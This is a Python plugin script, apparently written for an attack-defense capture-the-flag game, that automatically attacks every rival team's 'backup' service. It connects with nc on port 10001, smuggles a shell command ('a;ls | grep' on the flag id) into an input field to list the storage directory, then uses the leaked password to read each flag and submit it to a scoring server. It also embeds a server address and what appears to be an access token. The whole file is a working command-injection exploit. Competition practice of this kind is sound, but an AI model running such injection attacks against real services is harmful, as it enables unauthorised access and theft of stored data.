# Attempts to steal flags from all teams (except the test team and
# our own!) for the 'backup' service
def name():
    return "steal-backup-flags"

def help():
    return "Steal flags from the 'backup' service!"

def args():
    return ""

def run(args):
    from re import search
    from subprocess import Popen, PIPE, STDOUT
    import swpag_client
    from threading import Timer

    # Retrieve the list of flag targets for this tick for service 5 (configuration)
    t = swpag_client.Team("http://34.195.187.175", "f67634a9373be60a439287965e1d8562")
    backup_flags = t.get_targets(1)

    for target in backup_flags:
        team = target['hostname']
        flag_id = target['flag_id']

        # Make sure we're not trying to hack ourselves or the test accounts
        if team in ["team9", "team11", "team12"]:
            print("Skipping {0}".format(team))
            continue

        try:
            print("Trying {0}...".format(team))

            # Spin up an nc process for the service and a timer. The timer is a
            # fallback mechanism to ensure the process doesn't hang if we get
            # into an unexpected situation.
            p = Popen(["nc", team, "10001"], stdout=PIPE, stdin=PIPE)
            tt = Timer(3, p.kill)
            tt.start()

            # Send our maliciously crafted input to trick the backup service into
            # running ls on its storage directory, piped into grep to find the flag
            # file that we're looking for. The second half of the file name is the password.
            out = str(p.communicate(input="2\na;ls | grep {0};\n\n\n".format(flag_id).encode()))
            m = search("\w{20}_(\w{20})", out)

            if m == None:
                continue

            # Now use a new nc process to connect and read the file with the password
            # we found in the previous step. The contents will be the flag.
            p = Popen(["nc", team, "10001"], stdout=PIPE, stdin=PIPE)
            out = str(p.communicate(input="2\n{0}\n{1}\n\n\n".format(flag_id, m.group(1)).encode()))
            m = search("(FLG\w+)Hello", out)

            if m == None:
                continue

            # Send the flag to the scoring service, then cancel the timer since
            # we no longer need it.
            result = t.submit_flag([m.group(1)])
            tt.cancel()

            print("Submitting flag {0} for team {1}: {2}".format(m.group(1), team, result))
        except:
            print("Error")